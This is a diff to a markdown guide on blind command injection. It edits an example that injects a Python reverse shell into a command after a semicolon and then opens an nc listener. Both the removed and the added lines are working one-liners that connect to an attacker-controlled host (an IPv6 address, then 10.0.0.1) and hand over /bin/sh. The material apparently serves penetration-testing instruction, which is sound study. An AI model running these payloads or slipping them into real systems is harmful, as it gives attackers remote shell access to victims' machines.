@@ -34,11 +34,11 @@ Blind command injection occurs when the system command made to the server does n
 ### Example :
          
         ♥️  1. upload reverse shell :
-                                  ; python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
+                                  ;  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
            2. listen reverse shell :
 
-                                 nc -lnvp 4242
+                                 nc -lnvp 1234
 
 Note : 
            
